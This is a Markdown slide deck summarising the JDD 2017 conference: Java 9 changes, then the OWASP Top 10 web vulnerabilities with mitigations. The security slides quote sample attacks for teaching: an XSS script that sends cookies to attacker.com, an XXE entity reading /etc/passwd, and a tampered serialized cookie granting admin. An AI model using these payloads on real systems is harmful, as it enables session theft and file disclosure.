## JDD 2017 Summary

---

### Agenda for today

+++

- JDD 2017 Summary                          |
- JVM9                                      |
- TOP10 security vulnerabilities in WebApps |
- NGNIX & Lua*                              |

---

# JDD Summary

---

### +
- Some neat talks
  - Nginx + Lua = OpenResty
  - Serverless czyli jak zbudować aplikację bez serwera (za darmo)
  - Write NOW, Run Anytime
  - Co back-end developer powinien wiedzieć o Web Security
- After party

---?image=assets/jdd_v2.jpg&size=auto 60%

---

### -
- Most talks done by Poland's JUG members
- Insufficient amount of well known speakers
- Price:Value ratio low
- Small venue
+++

#### TL;DR

## Meh

### Go to Devoxx

---

### What's new in the JAVA 9?

---

### What’s New for the Java Language in JDK 9?

+++

#### Not much really:
##### JEP 213: Milling Project Coin
- @SafeVarags on private instance methods |
- You can use diamond syntax in conjunction with anonymous inner classes |
- The underscore character is not a legal name |
- Private interface methods are supported |

Note:
underscore - warning in JDK8, error in JDK9

+++ 

#### More Concise try-with-resources Statements

```java
final Resource resource1 = new Resource("resource1");
Resource resource2 = new Resource("resource2");

try (Resource r1 = resource1;
     Resource r2 = resource2) {
    ...
}

try (resource1;
     resource2) {
    ...
}
```

@[1](A final resource)
@[2](An effectively final resource)
@[3-7](Old way)
@[9-13](New and improved try-with-resources statement in Java SE 9)


### Key Changes in JDK 9

+++

#### Java Platform Module System (JSR 376)
- JEP 261: Module System |
- JEP 200: The Modular JDK |
- JEP 220: Modular Run-Time Images |
- JEP 260: Encapsulate Most Internal APIs |

Note:
module hell instead of classpath

+++

#### JEP 223: New Version-String Scheme
```
1.8.0_144-b01
```
##### VS.
```
$MAJOR.$MINOR.$SECURITY.$PATCH
```

---

## What’s New for Tools in JDK 9?

+++

- JEP 222: jshell: The Java Shell (Read-Eval-Print Loop)
- JEP 228: Add More Diagnostic Commands
- JEP 231: Remove Launch-Time JRE Version Selection
- **JEP 238: Multi-Release JAR Files**
- JEP 240: Remove the JVM TI hprof Agent
- JEP 241: Remove the jhat Tool	|
- **JEP 245: Validate JVM Command-Line Flag Arguments**
- JEP 247: Compile for Older Platform Versions
- JEP 282: jlink: The Java Linker

+++

#### JEP 238: Multi-Release JAR Files
- for libraries and frameworks - to express conditional platform dependencies
- better adoption of Java 9 rules
```
jar root
  - A.class
  - B.class
  - C.class
  - D.class
  - META-INF
     - versions
        - 9
           - A.class
           - B.class
        - 10
           - A.class
```

Note:
Third party libraries and frameworks typically support a range of Java platform versions, generally going several versions back. As a consequence they often do not take advantage of language or API features available in newer releases since it is difficult to express conditional platform dependencies, which generally involves reflection, or to distribute different library artifacts for different platform versions.

This creates a disincentive for libraries and frameworks to use new features, that in turn creates a disincentive for users to upgrade to new JDK versions---a vicious circle that impedes adoption, to everyone's detriment.

Some libraries and frameworks, furthermore, use internal APIs of the JDK that will be made inaccessible in Java 9 when module boundaries are strictly enforced. This also creates a disincentive to support new platform versions when there are public, supported API replacements for such internal APIs.

+++

#### JEP 245: Validate JVM Command-Line Flag Arguments

>Validate the arguments to all JVM command-line flags so as to avoid crashes, and ensure that appropriate error messages are displayed when they are invalid.
 
#### Example error msg

>MinHeapFreeRatio error: must have value in range [0...100]

---

## What’s New for Security in JDK 9?

+++

- JEP 219: Datagram Transport Layer Security (DTLS)
- JEP 244: TLS Application-Layer Protocol Negotiation Extension
- JEP 249: OCSP Stapling for TLS
- JEP 246: Leverage CPU Instructions for GHASH and RSA
- **JEP 273: DRBG-Based SecureRandom Implementations**
- **JEP 288: Disable SHA-1 Certificates**
- **JEP 229: Create PKCS12 Keystores by Default**
- JEP 287: SHA-3 Hash Algorithms

Note:
JEP 273: DRBG-Based SecureRandom Implementations	
Provides the functionality of **Deterministic Random Bit Generator** (DRBG) mechanisms as specified in NIST SP 800-90Ar1 in the SecureRandom API.
The DRBG mechanisms use modern algorithms as strong as **SHA-512 and AES-256**. Each of these mechanisms can be configured with different security strengths and features to match user requirements.
See Generating Random Numbers in Java Platform, Standard Edition Security Developer's Guide.

JEP 288: Disable SHA-1 Certificates
Improves the security configuration of the JDK by providing a more flexible mechanism to disable X.509 certificate chains with SHA-1-based signatures.
Disables SHA-1 in TLS Server certificate chains anchored by roots included by default in the JDK; local or enterprise certificate authorities (CAs) are not affected.
The jdk.certpath.disabledAlgorithms security property is enhanced with several new constraints that allow greater control over the types of certificates that can be disabled.

JEP 229: Create PKCS12 Keystores by Default
Modifies the default keystore type from JKS to PKCS12. PKCS#12 is an extensible, standard, and widely supported format for storing cryptographic keys. PKCS12 keystores improve confidentiality by storing private keys, trusted public key certificates, and secret keys. This feature also opens opportunities for interoperability with other systems such as Mozilla, Microsoft's Internet Explorer, and OpenSSL that support PKCS12.

---

## What’s New for Javadoc in JDK 9?

+++

- JEP 221: Simplified Doclet API	
- **JEP 224: HTML5 Javadoc**
- JEP 225: Javadoc Search	
- JEP 261: Module System

---

## What’s New for Internationalization in JDK 9?

+++

- JEP 267: Unicode 8.0	
- JEP 252: CLDR Locale Data Enabled by Default	
- JEP 226: UTF-8 Properties Files

---

## And the last bunch of "boring" changes:
## What’s New for Client Technologies in JDK 9

+++

- JEP 251: Multi-Resolution Images	
- JEP 253: Prepare JavaFX UI Controls and CSS APIs for Modularization	
- JEP 256: BeanInfo Annotations	
- JEP 262: TIFF Image I/O	
- JEP 263: HiDPI Graphics on Windows and Linux	
- JEP 272: Platform-Specific Desktop Features	
- JEP 283: Enable GTK 3 on Linux	

---

## And now's the time for more interesting changes!

---

## What’s New for the JVM in JDK 9

+++

- JEP 165: Compiler Control
- JEP 197: Segmented Code Cache	
- JEP 276: Dynamic Linking of Language-Defined Object Models

---

## What’s New for JVM Tuning in JDK 9

+++

- Improve G1 Usability, Determinism, and Performance	
- JEP 158: Unified JVM Logging	
- JEP 214: Remove GC Combinations Deprecated in JDK 8	
- **JEP 248: Make G1 the Default Garbage Collector**
- JEP 271: Unified GC Logging	
- JEP 291: Deprecate the Concurrent Mark Sweep (CMS) Garbage Collector

Note:
Will be talking about some other neat feature of G1 in a moment

Limiting GC pause times is, in general, more important than maximizing throughput. Switching to a low-pause collector such as G1 should provide a better overall experience, for most users, than a throughput-oriented collector such as the Parallel GC, which is currently the default.

Many performance improvements were made to G1 in JDK 8 and its update releases, and further improvements are planned for JDK 9. The introduction of concurrent class unloading (JEP 156) in JDK 8u40 made G1 a fully-featured garbage collector, ready to be the default.



---

## What’s New for Core Libraries in JDK 9?

+++

- **JEP 102: Process API Updates**
- **JEP 193: Variable Handles**
- **JEP 254: Compact Strings**	
- JEP 264: Platform Logging API and Service	
- **JEP 266: More Concurrency Updates**	
- JEP 268: XML Catalogs	
- **JEP 269: Convenience Factory Methods for Collections**
- JEP 274: Enhanced Method Handles	
- **JEP 277: Enhanced Deprecation**	
- JEP 285: Spin-Wait Hints	
- JEP 290: Filter Incoming Serialization Data	
- JEP 259: Stack-Walking API	
- JEP 255: Merge Selected Xerces 2.11.0 Updates into JAXP	

+++

#### JEP 102: Process API Updates
The ProcessHandle class provides the process's native process ID, arguments, command, start time, accumulated CPU time, user, parent process, and descendants. The class can also monitor processes' liveness and destroy processes. With the ProcessHandle.onExit method, the asynchronous mechanisms of the CompletableFuture class can perform an action when the process exits.

+++

#### JEP 193: Variable Handles

<ul>
<li class="fragment">`sun.misc.Unsafe` was spared (for now)</li>
<li class="fragment">this JEP Defines a standard means to invoke the equivalents of `java.util.concurrent.atomic` and `sun.misc.Unsafe` operations upon object fields and array elements</li>
<li class="fragment">Defines a standard set of fence operations, which consist of VarHandle static methods that enable fine-grained control of memory ordering. This is an alternative to `sun.misc.Unsafe`, which provides a nonstandard set of fence operations.</li>
<li class="fragment">Defines a standard reachability fence operation to ensure that a referenced object remains strongly reachable.</li>
<li class="fragment">best summary for this JEP is `less Unsafe`</li>
</ul>

+++

#### JEP 254: Compact Strings
[benchmarks](http://cr.openjdk.java.net/~shade/density/state-of-string-density-v1.txt)
[report](http://cr.openjdk.java.net/~huntch/string-density/reports/String-Density-SPARC-jbb2005-Report.pdf)

<ul>
<li class="fragment">**21%** reduction in live data (retained bytes after a GC) (363 MB vs 458 MB)</li>
<li class="fragment">**23%** longer amount of time between in GC events during the heaviest load of benchmark execution, (29 seconds vs 23.5)</li>
<li class="fragment">**12%** lower GC time (430 ms vs 490 ms)</li>
<li class="fragment">**10%** improvement in throughput performance score (37002, 33403)</li>
</ul>

Note:
Looks promising, can be biased though. Time will tell.

In JEP 192: String Deduplication in G1 (JDK 8) some other improvement was added

In terms of memory footprint reduction, the amount of live data during heaviest load of the
benchmark execution, the String Density JDK shows a 21% reduction in live data (retained bytes
after a GC) in the Java heap versus a JDK 9 baseline, (363 MB for String Density, 458 MB for
baseline JDK 9).
In terms of the frequency of GC, the String Density JDK allowed the application to execute
23% longer amount of time between in GC events during the heaviest load of benchmark
execution, (29 seconds for String Density JDK, 23.5 seconds for JDK 9 baseline). Since the
workload is run for a specific amount of wall clock time, the total number of GC events observed
with the String Density is about 17% fewer, (15 for String Density, 18 for baseline JDK 9).
STRING DENSITY 1
Secondarily, in terms of the amount of time spent in GC when under peak load, the String
Density JDK observed about 12% lower GC time than that of the baseline JDK 9, (430 ms for
String Density, 490 ms for baseline JDK 9). And, in terms of the throughput performance score
at peak load, the String Density JDK realized about a 10% improvement in throughput
performance score versus the baseline JDK 9, (37002 for String Density JDK, 33403 for baseline
JDK 9).
Hence, in all metrics observed as goals for the experiment there is an improvement with the
String Density JDK. 

+++

#### JEP 266: More Concurrency Updates
- Reactive Streams API |
- Enhancements to the `CompletableFuture`
  - time-based - `orTimeout` and `completeTimeout`
  - subclass enhancements
- Numerous implementation improvements accumulated since JDK 8; many of them are small, but some include Javadoc spec rewordings.

+++

#### JEP 277: Enhanced Deprecation	

```java
@Deprecated(since="9", forRemoval=true)
```

New tool available - `jdeprscan`

+++

#### JEP 269: Convenience Factory Methods for Collections
     
```java
Set<String> set = new HashSet<>();
set.add("a");
set.add("b");
set.add("c");
set = Collections.unmodifiableSet(set);

Set<String> set = Collections.unmodifiableSet(new HashSet<>(Arrays.asList("a", "b", "c")));

Set<String> set = Collections.unmodifiableSet(new HashSet<String>() {{
    add("a"); add("b"); add("c");
}});

Set<String> set = Collections.unmodifiableSet(Stream.of("a", "b", "c").collect(toSet()));

Set<String> set = Set.of("a", "b", "c");
```

@[1-5](#facePalm)
@[7](#facePalm2)
@[9-11](#screamingDoubleFacePalm)
@[13](#stillFacePalm)
@[15](Well done JAVA... C# had this function since like... forever?)

+++?image=https://media.giphy.com/media/BC3RANWyJtlgA/giphy.gif&size=auto 50%

---

## Summary

- JIGSAW is not the only, noteworthy change in the new JAVA version
- Industry adoption is not that bad, as one could think of (e.g. Spring 5, Gradle / Maven, newest Scala (except JIGSAW))
- There's general consensus in NA, that we will give the JVM9 some more time to settle-in in the industry

---

## And remember:
>New is always better!

<span style="font-size:0.6em; color:gray; float:right;">Barney Stinson</span>

---

# TOP 10 SECURITY ISSUES

Number 1 will surprise you!

---

# Said who?

## OWASP

Note:
Short time here, just go to next slide for detailed summary

+++

## What is OWASP

The Open Web Application Security Project

Note:
The Open Web Application Security Project - open community which is dedicated to enabling organizations
to develop, purchase and maintain applications which can be trusted. Non-profit, almost everyone is volunteer.

---

## Where does the data come from?

- 40+ data submissions from security companies |
- 515 individuals |
- Data spans 100k applications |

Note:
The OWASP Top 10 for 2017 is based primarily on 40+ data submissions from firms that specialize in application security and an
industry survey that was completed by 515 individuals. This data spans vulnerabilities gathered from hundreds of organizations and
over 100,000 real-world applications and APIs.

---?image=assets/start.gif&size=auto 60%

---

# Insufficient Logging and Monitoring
Number 10

+++

## What's that?

- Insufficient logging and monitoring |
- Ineffective incident response |

Note:
- Obviously the cause of insufficient logging is insufficient logging,
- But ineffective response to incidents are included in this point as well
- These flaws allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper with data.

+++

## How do I fight it?

<ul>
    <li class="fragment">All login, access control failures and input validation failures should be logged</li>
    <li class="fragment">Establish effective monitoring and alerting</li>
    <li class="fragment">Establish / adapt incident response and recovery plan (Such as one provided by [NIST](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final))</li>
</ul>

Note:
NIST -> National Institute of Standards and Technology

---

# Using Components with Known Vulnerabilities
Number 9

+++

## What's that?

Components (ex. libraries, frameworks) run with the same privileges as the application. 


If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.


Note:
As you know, components...

So if a vulnerable...

+++

## How do I fight it?
<ul>
    <li class="fragment">Keep your dependencies up to date (tools: [versions](http://www.mojohaus.org/versions-maven-plugin/), [OWASP DependencyCheck](https://www.owasp.org/index.php/OWASP_Dependency_Check), [retire.js](https://github.com/retirejs/retire.js/))</li>
    <li class="fragment">Monitor sources like [Common Vulnerabilities and Exposures](https://cve.mitre.org/) and [National Vulnerability Database](https://nvd.nist.gov/) </li>
    <li class="fragment">Get packages from official sources and prefer signed packages</li>
    <li class="fragment">If update is not possible, consider using [virtual patch](https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F)</li>
</ul>

Note:
- Obviously keep your deps up to date
- Monitor sources like (list em) for updates
- Get Signed packages from official sources
- If update not possible, use virtual patching

---

## What is virtual patch?

#### A security policy enforcement layer which prevents the exploitation of a known vulnerability.

Note:
Since it's going to be mentioned few times, it would be nice to explain what Virtual Patch is. Its...

+++

## What is virtual patch?

The virtual patch works since the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. 

---

# Insecure Deserialization
Number 8

+++

## What's that?

Insecure deserialization flaws occur when an application receives hostile serialized objects.

+++

### Example:

Application uses object serialization to save a cookie containing user ID, role, password hash.

```json
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```
@[1-2](Given the cookie)
@[4-5](Attacker changes the object to give themselves admin privileges)

+++

## How do I fight it?

- Don't accept serialized objects from untrusted sources |
- Only permit primitive data types |

Note:
The only safe architectural pattern is to not accept serialized
objects from untrusted sources or only permit primitive data types.

+++

## How do I fight it?

If not possible then:
- Monitor deserialization and alert if a user deserializes a lot |
- Log deserialization exceptions/failures |
- Put code which deserializes in low privilege environment |
- Enforce strict type constraints during deserialization before object creation |

---

# Cross-Site Scripting (XSS)
Number 7

+++

## What's that?

* Application includes untrusted data in a new web page without validation or escaping
* Application updates an existing web page with user supplied data using a browser API that can create JavaScript

+++

### Example:

```java
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";

'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
```

@[1-2](The application uses untrusted data in the construction of the following HTML snippet without validation or escaping)
@[4-6](The attacker modifies the ‘CC’ parameter in his browser and executes a script)

Note:
Double click!

+++

## How do I fight it?
- Use safe frameworks that automatically escape for XSS by design (ex. ReactJS) |
- Validate inputs |
- Escape outputs |

Note:
Links: https://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet
---

# Security Misconfiguration
Number 6

+++

## What's that?

Name says it all, but for example:
- Insecure default configurations |
- Misconfigured HTTP headers |
- Error messages containing sensitive information |
- Not patching or upgrading systems, frameworks, dependencies, and components in a timely fashion |

+++

### Example:

The app server admin console is automatically installed and not removed.

+++

## How do I fight it?

- Create repeatable process for deploying locked down environment |
- Dev, QA and prod environments should be configured identically |
- Remove unused dependencies and frameworks | 
- Update as fast as possible (See Number 9) |
- Automated configuration verification process |

Note:
Ad2 - (With different credentials obviously)

---

# Broken Access Control
Number 5

+++

## What's that?

Restrictions on what authenticated users are allowed to do are not properly enforced. 


Attackers can exploit these flaws to access unauthorized functionality and/or data.

+++

### Example:

```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

example.com/app/accountInfo?acct=notmyacct
```
@[1-2](The application uses unverified data in a SQL call that is accessing account information)
@[4](An attacker simply modifies the 'acct' parameter)

Note:
Double click!

+++

## How do I fight it?

- With the exception of public resources, deny by default |
- Implement access control mechanisms once and re-use them throughout the application |
- Disable web server directory listing, ensure file metadata (ex. .git) is not present within web roots |
- Log access control failures |
- Rate limiting API to minimize the harm from automated attack tooling |
- Access control unit and integration tests |

---

# XML External Entities (XEE)
Number 4

+++

## What's that?

The XML standard includes the idea of an external general parsed entity (an external entity). 


During parsing of the XML document, the parser will expand these links and include the content of the URI in the returned XML document.

+++

### Example:

The attacker attempts to extract data from the server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>

```

+++

## How do I fight it?

- Disable XML external entity and DTD processing |
- Validate inputs |
- Patch or upgrade all the latest XML processors and libraries |
- Upgrade SOAP to the latest version |
- If these controls are not possible, consider using virtual patching |

Note:
DTD -> Document type definition

---

# Sensitive Data Exposure
Number 3

+++

## What's that?

Web applications and APIS don't protect sensitive data.

Note:
So, what's that? Basically it' when Web applications ...

+++

### Example:

An application encrypts credit card numbers in a database using automatic database encryption. 


However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text.

+++

## How do I fight it?
<ul>
    <li class="fragment">Discard sensitive data as soon as possible</li>
    <li class="fragment">Make sure you encrypt all sensitive data at REST</li>
    <li class="fragment">Encrypt all data in transit</li>
    <li class="fragment">Ensure up-to-date and strong standard algorithms or ciphers</li>
    <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
    <li class="fragment">Disable caching for responses that contain sensitive data</li>
</ul>

---

# Broken Authentication
Number 2

+++

## What's that?

Application functions related to authentication and session management implemented
incorrectly, allowing attackers to compromise:
- Passwords |
- Keys |
- Session tokens |
- Exploit other implementation flaws to assume other users’ identities |

+++

### Example:

Credential stuffing is a common attack. 


If an application does not rate limit authentication attempts


Then the application can be used as a password oracle to determine if the credentials are valid

Note:
Credential stuffing -> the use of lists of known passwords

+++

## How do I fight it?
<ul>
    <li class="fragment">Do not deploy with any default credentials</li>
    <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
    <li class="fragment">Implement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)</li>
    <li class="fragment">Where possible, implement multi-factor authentication</li>
    <li class="fragment">Log authentication failures</li>
    <li class="fragment">Align password length, complexity and rotation policies with [NIST 800-63 B's guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)</li>
</ul>

Note:
NIST -> National Institute of Standards and Technology
---

# Injection
Number 1

+++

## What's that?

Injection occurs when untrusted data is sent to an interpreter as part of a command or query.


The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

+++

### Example:

![Relevant XKCD](assets/injection_maymay.png)

+++

## How do I fight it?

Sanitize your inputs

---

### That's all folks!

Sources:
- [Top 10 by OWASP](https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20RC2%20Final.pdf)
- [XEE Definition from Wikipedia](https://en.wikipedia.org/wiki/XML_external_entity_attack)
